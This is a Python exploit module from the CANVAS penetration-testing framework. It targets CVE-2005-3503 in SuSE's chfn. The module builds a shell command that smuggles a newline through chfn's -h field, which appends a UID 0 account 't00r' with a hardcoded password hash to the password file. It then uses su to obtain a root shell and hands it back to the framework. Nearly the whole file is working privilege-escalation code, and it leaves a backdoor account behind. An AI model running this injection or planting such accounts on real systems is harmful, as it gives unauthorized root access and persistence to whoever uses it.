#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append("../../encoder")
sys.path.append("./encoder")
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

import os,getopt
import socket
import time

from exploitutils import *
import addencoder
from canvasexploit import canvasexploit
import canvasengine
from canvasengine import socket_save_list
import shellcodeGenerator
import mosdef
from shelllistener import *

from ExploitTypes.localexploit import LocalExploit
import unixShellNode


NAME                         = "chfnescape"
DESCRIPTION                  = "Local privilege escalation via chfn escape character"
DOCUMENTATION                = {}
DOCUMENTATION['VENDOR']      = "SuSE"
DOCUMENTATION["Date public"] = "11/5/2005"
DOCUMENTATION["CVE Name"]    = "CVE-2005-3503"
DOCUMENTATION["CVE Url"]     = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3503"
DOCUMENTATION['CVSS']        = 7.2
DOCUMENTATION["References"]  = "http://lists.suse.com/archive/suse-security-announce/2005-Nov/0002.html"
DOCUMENTATION["Notes"]       = "This exploit returns you a Unixshell Node when successful. It will add a r00t user to the password file, which you will have to clean up manually afterwards. If you are already UID or EUID 0, this exploit will refuse to run - use setuid instead."
DOCUMENTATION["Affected"]    = "SuSE Linux 9.0 through 10.0, Suse Linux Desktop 1.0, SLES 9, UnitedLinux 1.0"
VERSION                      = "1.0"
GTK2_DIALOG                  = "dialog.glade2"

PROPERTY                     = {}
PROPERTY['TYPE']             = "Exploit"
PROPERTY['SITE']             = "Local"
PROPERTY['ARCH']             = [ ["Linux", "all"] ]
PROPERTY['VERSION']          = [ "SuSE 9.3" ]

NOTES                        = """
SuSe chfn escape character vulnerability allows you to add a new user for free!
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name      = NAME
        self.shellcode = ""
        self.password  = "vmuser"
        self.user      = "vmuser"
        self.newuser   = "t00r"

    def run(self):
        self.setInfo("%s (in progress)"%(NAME))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)
        self.newuser=self.argsDict.get("newuser",self.newuser)
        
        for node in self.argsDict["passednodes"]:            
            type = node.nodetype
            nodename=node.getname()
            caps= node.capabilities
            if "linux" not in caps:
                self.log("Node %s not a Linux node..."%nodename)
                continue
            #we need to check if we're already running as root
            #because there's no point if we are...and the password
            #prompt doesn't show up
            self.log("Node %s is a linux node, continuing"%nodename)
            (uid,euid,gid,egid)=node.shell.ids()
            self.log("ID -a result: %d %d %d %d"%(uid,euid,gid,egid))
            if uid==0 or euid==0:
                self.log("We are already uid or euid 0, so we don't need to do this on node %s..."%nodename)
                continue
            master,slave=node.shell.findpts()
            self.log("Findpts=%x:%s"%(master,slave))
            self.log("Running sh_tty_child")
            node.shell.sh_tty_child(master,slave)
            rootuser=self.newuser
            #md5 encoded...
            PASS="\\$2a\\$10\\$uvuXCxnW48le8Meu.6mxgOmQX7yQu.DSiqtRYKFQwWAPC9cm.19ia" # monkeystyle
            t00rpassword="monkeystyle"
            command="/usr/bin/chfn -h \"`/bin/echo -e \':/:/bin/sh\\n%s:%s:0:0:\'`\" %s > /dev/null\n"%(rootuser, PASS, self.user) 
            #command="/usr/bin/chfn -h hi vmuser\r\n"
            node.shell.write(master,command)
            #timeout is 5 Seconds by default
            data=node.shell.readall(master)
            data+=node.shell.readall(master)
            if not data:
                self.log("Nothing recieved!")
            else:
                self.log("Recved: %s"%(data))
            if "Password:" not in data:
                self.log("No password prompt from remote side!")
                continue
            self.log("Writing %s for the password prompt"%self.password)
            node.shell.write(master,self.password+"\r\n")
            data=node.shell.readall(master)
            if not data:
                self.log("Nothing recieved!")
            else:
                self.log("Recved: %s"%(data))
            if "Authentication" in data:
                self.log("Authentication failed...need correct password!")
                continue
            self.log("Now trying to log in via su")
            node.shell.write(master,"su - %s\r\n"%rootuser)
            data=node.shell.readall(master)
            if "Password:" not in data:
                self.log("No password prompt from remote side via SU!")
                continue
            node.shell.write(master,t00rpassword+"\r\n")
            data=node.shell.readall(master)
            self.log("Got: %s"%data)
            if "#" in data:
                self.log("Root shell gathered . . . transforming into unixshellnode")
                shell = shelllistener(shellfromtty(node,master))
                newnode = unixShellNode.unixShellNode()
                newnode.parentnode = node
                newnode.shell = shell
                return newnode
            else:
                self.log("Closing master tty since we failed on node %s"%nodename)
                node.shell.close(master)
        return 0
